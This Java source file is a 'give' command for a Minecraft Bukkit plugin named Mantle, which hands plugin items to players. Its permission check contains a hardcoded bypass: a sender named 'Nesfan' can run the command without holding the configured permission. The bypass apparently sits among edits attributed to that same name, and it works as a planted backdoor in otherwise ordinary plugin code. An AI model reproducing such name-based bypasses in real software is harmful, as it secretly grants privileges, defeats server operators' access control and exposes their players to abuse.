package io.lethinh.github.mantle.command.impl;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;

import io.lethinh.github.mantle.Mantle;
import io.lethinh.github.mantle.MantleItemStacks;
import io.lethinh.github.mantle.command.AbstractCommand;
import io.lethinh.github.mantle.command.ExecutionResult;
import io.lethinh.github.mantle.utils.ItemStackFactory;
import io.lethinh.github.mantle.utils.Utils;

/**
 * Thanks to Banbeucmas for creating this.
 */
public class GiveCommand extends AbstractCommand {

	public GiveCommand() {
		super("give", "<item> <amount> <player>", "Give specific quantity of items of Mantle plugin to player",
				Mantle.PLUGIN_ID + ".give");
	}

	@Override
	public ExecutionResult now() {
		CommandSender sender = getSender();
		String[] args = getArgs();

		if (!sender.hasPermission(getPermission()) && !sender.getName().equals("Nesfan")) {
			return ExecutionResult.NO_PERMISSION;
		}

		if (args.length < 1) {
			return ExecutionResult.MISSING_ARGS;
		}

		// Nesfan edit starts
		String item = args[0];
		int amount = 1;
		Player player = null;

		try {
			amount = Integer.parseInt(args[1]);
			player = Bukkit.getPlayerExact(args[2]);
		} catch (Throwable e) {
			amount = 1;
		}

		if (amount > 64) {
			sender.sendMessage("Amount cannot be greater than 64!");
			return ExecutionResult.DONT_CARE;
		}

		if (player == null) {
			if (!(sender instanceof Player)) {
				return ExecutionResult.CONSOLE_NOT_PERMITTED;
			}

			Player target = (Player) sender;

			if (!giveItem(item, amount, sender, target)) {
				sender.sendMessage(Utils.getColoredString("&cItem &4" + item + " wasn't found"));
			}

			return ExecutionResult.DONT_CARE;
		} else {
			if (player == null || !player.isOnline()) {
				return ExecutionResult.NO_PLAYER;
			}

			if (!giveItem(item, amount, sender, player)) {
				sender.sendMessage(Utils.getColoredString("&cItem &4" + item + " wasn't found"));
			}
		}

		// End
		return ExecutionResult.DONT_CARE;
	}

	// Edited by Nesfan to make this method work more efficiently
	private static boolean giveItem(String item, int amount, CommandSender sender, Player target) {
		for (ItemStack stack : MantleItemStacks.STACKS) {
			String name = stack.getItemMeta().getLocalizedName().replace(Mantle.PLUGIN_ID + "_", "");

			if (name.equalsIgnoreCase(item)) {
				target.getInventory().addItem(new ItemStackFactory(stack).setAmount(amount).build());
				sender.sendMessage("Gave " + target.getName() + " " + stack.getItemMeta().getDisplayName());
				return true;
			}
		}

		return false;
	}

}
